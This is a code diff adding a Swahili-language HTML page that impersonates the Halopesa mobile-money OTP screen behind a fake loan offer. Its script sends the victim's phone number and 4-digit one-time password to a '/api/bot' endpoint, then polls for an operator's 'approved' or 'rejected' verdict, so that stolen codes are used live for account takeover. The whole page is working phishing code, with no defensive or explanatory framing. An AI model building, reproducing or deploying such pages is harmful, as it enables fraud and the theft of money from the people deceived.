@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halopesa - OTP 2</title>
+    <style>
+        * { box-sizing: border-box; font-family: sans-serif; }
+        body { margin: 0; background-color: white; display: flex; justify-content: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 400px; padding: 20px; display: flex; flex-direction: column; }
+        .back { font-size: 24px; cursor: pointer; margin-bottom: 30px; color: #333; text-decoration: none; }
+        h1 { font-size: 22px; color: #1a1a2e; margin-bottom: 10px; }
+        p { color: #555; font-size: 14px; margin-bottom: 20px; }
+        .otp-container { display: flex; justify-content: space-between; margin: 20px 0; }
+        .otp-box { width: 60px; height: 60px; border: 1px solid #ccc; border-radius: 8px; background: #f9f9f9; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: bold; color: #333; text-align: center; }
+        .otp-box:focus { outline: none; border-color: #E65C00; background: white; }
+        .timer { text-align: center; color: #555; font-size: 14px; margin: 20px 0; }
+        .timer span { color: #E65C00; font-weight: bold; }
+        .error-msg { color: #E65C00; font-weight: bold; text-align: center; display: none; margin-bottom: 15px; }
+        .btn-main { width: 100%; background-color: #e0e0e0; color: #999; font-size: 16px; font-weight: bold; padding: 15px; border: none; border-radius: 8px; margin-top: auto; cursor: pointer; margin-bottom: 20px;}
+        .btn-main:not(:disabled) { background-color: #E65C00; color: white; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #E65C00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div id="overlay">
+        <div class="spinner"></div>
+        <h2 style="color:#E65C00;">Inathibitisha...</h2>
+        <p>Tafadhali subiri.</p>
+    </div>
+    <div class="container">
+        <a href="otp1.html" class="back">&#8592;</a>
+        <h1>Ingiza code ya OTP</h1>
+        <p>Code ya OTP imetumwa kwa namba yako ya simu.</p>
+        <div class="error-msg" id="otpError">OTP isiyo sahihi. Jaribu tena.</div>
+        <div class="otp-container">
+            <input type="tel" class="otp-box" id="otp1" maxlength="1" oninput="move('otp2')">
+            <input type="tel" class="otp-box" id="otp2" maxlength="1" oninput="move('otp3')">
+            <input type="tel" class="otp-box" id="otp3" maxlength="1" oninput="move('otp4')">
+            <input type="tel" class="otp-box" id="otp4" maxlength="1" oninput="check()">
+        </div>
+        <div class="timer">Hukupata OTP? Tuma tena OTP(<span id="timerText">00:30</span>)</div>
+        <button id="btnNext" class="btn-main" disabled onclick="submitOtp()">Endelea</button>
+    </div>
+
+    <script>
+        var globalUserId = Date.now().toString().slice(-6);
+        var userPhone = sessionStorage.getItem('userPhone') || "+255000000000";
+        var timerInterval;
+
+        function startTimer() {
+            var timeLeft = 30;
+            timerInterval = setInterval(function() {
+                timeLeft--;
+                document.getElementById('timerText').innerText = '00:' + (timeLeft < 10 ? '0' : '') + timeLeft;
+                if (timeLeft <= 0) clearInterval(timerInterval);
+            }, 1000);
+        }
+        startTimer();
+
+        function move(nextId) { document.getElementById(nextId).focus(); check(); }
+        function check() {
+            var otp = "";
+            for(var i=1; i<=4; i++) { otp += document.getElementById('otp'+i).value; }
+            document.getElementById('btnNext').disabled = (otp.length !== 4);
+        }
+
+        function submitOtp() {
+            var otp = "";
+            for(var i=1; i<=4; i++) { otp += document.getElementById('otp'+i).value; }
+            if(otp.length !== 4) return;
+
+            document.getElementById('overlay').style.display = 'flex';
+            
+            fetch('/api/bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    action: 'send', type: 'OTP2', userId: globalUserId, 
+                    data: { phone: userPhone, value: otp } 
+                })
+            }).then(function() { pollStatus(); })
+            .catch(function() {
+                document.getElementById('overlay').style.display = 'none';
+                alert("Hitilafu ya mtandao.");
+            });
+        }
+
+        function pollStatus() {
+            var interval = setInterval(function() {
+                fetch('/api/bot?userId=' + globalUserId + '&type=OTP2')
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    if (data.status === 'approved') {
+                        clearInterval(interval);
+                        alert("Mafanikio! Ombi lako la mkopo linashughulikiwa.");
+                        window.location.href = 'index.html';
+                    } 
+                    else if (data.status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('overlay').style.display = 'none';
+                        document.getElementById('otpError').style.display = 'block';
+                        for(var i=1; i<=4; i++) { document.getElementById('otp'+i).value = ''; }
+                        document.getElementById('btnNext').disabled = true;
+                    }
+                });
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
